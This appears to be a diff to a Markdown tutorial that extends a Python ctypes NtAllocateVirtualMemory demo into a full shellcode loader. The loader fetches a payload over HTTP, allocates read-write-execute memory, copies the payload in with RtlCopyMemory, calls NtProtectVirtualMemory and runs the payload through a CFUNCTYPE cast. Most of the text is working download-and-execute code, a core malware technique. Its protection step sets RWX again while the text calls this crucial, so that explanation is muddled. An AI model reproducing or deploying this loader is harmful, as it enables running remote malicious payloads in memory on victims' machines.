@@ -9,12 +9,14 @@ In Windows, API calls from user-space are often translated into lower-level syst
 - [Windows Native API - Wikipedia](https://en.wikipedia.org/wiki/Windows_Native_API)
 - [Windows Memory Protection Constants](https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants)
 - [NtAllocateVirtualMemory Documentation](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory)
-- [GetCurrentProcess - Microsoft Docs](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess)
+- [NtProtectVirtualMemory Reference](https://github.com/m417z/ntdoc/blob/main/descriptions/ntprotectvirtualmemory.md)
+- [RtlCopyMemory Documentation](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemory)
+- [CFUNCTYPE Documentation](https://docs.python.org/3/library/ctypes.html#ctypes.CFUNCTYPE)
+
 
 ## Building the Script
 
-We will use the `NtAllocateVirtualMemory` function from the _NTDLL_ library. This function allows for the allocation of memory in a process’s virtual address space.
-
+We will use the `NtAllocateVirtualMemory` function from the _NTDLL_ library. This function allows for the allocation of memory in a process’s virtual address space, and we will also use `NtProtectVirtualMemory` to update the memory protection later. The script will fetch the shellcode from an HTTP server, allocate memory, copy the shellcode into the allocated memory, update memory protection, and finally execute the shellcode.
 
 To start, we import the necessary modules from the `ctypes` library, which allows us to interact with Windows APIs at a low level.
 
@@ -23,83 +25,130 @@ from ctypes import *
 from ctypes import wintypes
 ```
 
-Next, we define the argument types the function expects.
+Next, we define the argument types the functions expect.
 
-```ruby
+```python
 NtAllocateVirtualMemory = windll.ntdll.NtAllocateVirtualMemory
-
 NtAllocateVirtualMemory.argtypes = (
     wintypes.HANDLE, POINTER(wintypes.LPVOID),
     wintypes.ULONG, POINTER(wintypes.ULONG),
     wintypes.ULONG, wintypes.ULONG
 )
+NtAllocateVirtualMemory.restype = NTSTATUS
 
-NtAllocateVirtualMemory.restype = wintypes.DWORD
+NtProtectVirtualMemory = windll.ntdll.NtProtectVirtualMemory
+NtProtectVirtualMemory.argtypes = (
+    wintypes.HANDLE, POINTER(wintypes.LPVOID),
+    POINTER(wintypes.ULONG), wintypes.ULONG,
+    POINTER(wintypes.ULONG)
+)
+NtProtectVirtualMemory.restype = NTSTATUS
 ```
 
 - `argtypes`: Defines the expected types for the function's arguments.
-- `restype`: Specifies the return type, which in this case is a `DWORD` (error code or success).
+- `restype`: Specifies the return type for the functions (`NTSTATUS` for both functions).
 
 <br>
 
-The `NtAllocateVirtualMemory` function requires the following parameters:
-
-1. **ProcessHandle**: A handle to the target process for which the memory allocation is to be performed.
-   
-2. **BaseAddress**: A pointer to a variable that will receive the base address of the allocated memory region. Setting this to `0` allows the operating system to determine the address.
-
-3. **ZeroBits**: The number of high-order address bits that must be zero in the base address. This parameter is only relevant when the OS determines the base address.
-
-4. **RegionSize**: A pointer to a variable that will receive the actual size of the allocated memory region (in bytes).
-
-5. **AllocationType**: A bitmask that specifies the type of allocation to be performed..
-
-6. **Protect**: A bitmask specifying the protection desired for the committed memory pages.
-
-<br>
-
-We now set the parameters with appropriate values and make the function call.
+Now, we fetch the shellcode from the HTTP server.
 
 ```python
-ProcessHandle = 0xFFFFFFFFFFFFFFFF
+print("Fetching shellcode from server...")
+
+response = requests.get(URL)
+shellcode = response.content
+shellcode_length = len(shellcode)
+
+print(f"Shellcode fetched: {shellcode_length} bytes.")
+```
+
+Here, we send a GET request to the server to fetch the shellcode. The shellcode is then stored in the `shellcode` variable, and we print out its length.
+
+<br>
+
+We then define the memory allocation parameters and use `NtAllocateVirtualMemory` to allocate memory for the shellcode. The memory size is rounded up to the nearest page size.
+
+```python
+ProcessHandle = 0xffffffffffffffff
 BaseAddress = wintypes.LPVOID(0x0)
 ZeroBits = wintypes.ULONG(0)
-RegionSize = wintypes.ULONG(4096)
-AllocationType = 0x00001000 | 0x00002000
-Protect = 0x40
 
-ptr = NtAllocateVirtualMemory(
+PAGE_SIZE = 4096
+RegionSize = wintypes.ULONG((shellcode_length + PAGE_SIZE - 1) // PAGE_SIZE * PAGE_SIZE)
+AllocationType = MEM_COMMIT | MEM_RESERVE
+
+res = NtAllocateVirtualMemory(
     ProcessHandle,
     byref(BaseAddress),
     ZeroBits,
     byref(RegionSize),
     AllocationType,
-    Protect
+    PAGE_EXECUTE_READ_WRITE
 )
+
+if res != 0:
+    raise RuntimeError(f"NtAllocateVirtualMemory failed. Status code -> {res}")
+
+print(f"Memory allocated at -> {hex(BaseAddress.value)}")
 ```
 
-The value `0xFFFFFFFFFFFFFFFF` represents a pseudo handle used to refer to the current process, allowing the memory allocation to occur within the calling process's address space. By setting the base address to `0x0`, the operating system is instructed to automatically determine the appropriate base address for the allocated memory region. The value `0` for zero bits means there are no specific high-order address bits that need to be zeroed, allowing the operating system to manage address alignment.
+The memory is allocated with `MEM_COMMIT | MEM_RESERVE` flags and a `PAGE_EXECUTE_READ_WRITE` protection. The allocated memory is printed.
 
-A region size of `4096` bytes (4KB) is specified, and the allocation type `0x00001000 | 0x00002000` combines the flags for both reserving and committing memory. Finally, the value `0x40` sets the memory protection to `PAGE_EXECUTE_READWRITE`, which enables the allocated memory to be read, written to, and executed.
+<br>
 
-
-Finally, if the function call is successful, we print the base address of the allocated memory region and wait for 3 minutes to allow inspection.
+Next, we copy the shellcode into the allocated memory using `RtlCopyMemory`.
 
 ```python
-if ptr == 0:
-    print("NtAllocateVirtualMemory: pointer ->", hex(BaseAddress.value))
-    time.sleep(180)
+shellcode_ptr = (c_char * shellcode_length).from_buffer_copy(shellcode)
+RtlCopyMemory = windll.ntdll.RtlCopyMemory
+RtlCopyMemory.argtypes = (wintypes.LPVOID, wintypes.LPCVOID, SIZE_T)
+RtlCopyMemory.restype = None
+
+RtlCopyMemory(
+    BaseAddress,
+    shellcode_ptr,
+    shellcode_length
+)
+
+print("Shellcode copied to allocated memory.")
 ```
+
+We then update the memory protection to `PAGE_EXECUTE_READ_WRITE` using `NtProtectVirtualMemory`.
+
+```python
+NewProtect = PAGE_EXECUTE_READ_WRITE
+OldProtect = wintypes.ULONG(0)
+
+res = NtProtectVirtualMemory(
+    ProcessHandle,
+    byref(BaseAddress),
+    byref(RegionSize),
+    NewProtect,
+    byref(OldProtect)
+)
+
+if res != 0:
+    raise RuntimeError(f"NtProtectVirtualMemory failed. Status code -> {res}")
+
+print("Memory protection updated to PAGE_EXECUTE_READ_WRITE.")
+```
+
+The protection is updated to allow execution of the shellcode. This step is crucial for allowing the shellcode to execute from memory.
+
+
+Finally, we define the shellcode function type and cast the allocated memory address to a callable function.
+
+```python
+shellcode_func = CFUNCTYPE(None)
+shellcode_callable = cast(BaseAddress, shellcode_func)
+
+print("Executing shellcode...")
+shellcode_callable()
+```
+
+The `shellcode_func` type is defined as a function that takes no arguments and returns nothing. We cast the allocated memory address (`BaseAddress`) to this function type and then call the function to execute the shellcode.
+
 
 ## Example Output
 
-If the memory allocation is successful, the console will display something like:
-
-```
-NtAllocateVirtualMemory: pointer -> 0x[...]
-```
-
-In the screenshot, we can see the allocated memory region (`0x1e28bcd0000`) with 4KB of memory and `RWX` (read, write, execute) protection flags.
-
-![ss_process_hacker](https://github.com/user-attachments/assets/5bb73078-5b5a-4d63-94de-55d0e561a228)
-
+![ss_demo](https://github.com/user-attachments/assets/ad8ac741-7c5a-4b15-bf29-6aae41cda892)
